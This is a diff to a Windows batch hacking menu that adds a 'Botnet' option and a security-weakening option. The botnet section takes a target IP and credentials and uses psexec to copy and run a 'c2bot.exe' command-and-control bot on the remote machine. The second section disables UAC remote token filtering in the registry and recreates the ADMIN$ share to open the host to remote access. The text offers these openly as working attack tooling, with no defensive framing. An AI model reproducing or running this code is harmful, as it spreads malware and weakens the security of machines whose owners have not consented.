@@ -235,3 +235,35 @@ if exist port_scan_log.txt (
 )
 pause
 goto MENU
+
+:Btn
+cls
+echo === Botnet ===
+echo.
+echo if you using this you need to go website(https://learn.microsoft.com/tr-tr/sysinternals/downloads/psexec)and download the PStools
+echo IP Adress here(e.g. 192.168.1.50):
+set /p target_ip=
+echo Host Name (e.g. Administrator):
+set /p pc_user=
+echo password (If it has not password press enter only):
+set /p pc_pass=
+echo.
+give the c2bot.exe's adress here
+set /p adr=
+set adr=%adr:"=%
+echo Access trying
+psexec \\%target_ip% -u %pc_user% -p "%pc_pass%" -d -c "%adr%"
+pause
+goto MENU
+
+:adsh
+echo [!] Admin sharing and UAC restrictions are being removed...
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f >nul 2>&1
+net share ADMIN$=C:\Windows >nul 2>&1
+if %errorlevel% equ 0 (
+    echo [+] Operation successful! The system is now more open to remote connections.
+) else (
+    echo [-] Error! Please ensure you run this script as ADMINISTRATOR.
+)
+pause
+goto MENU
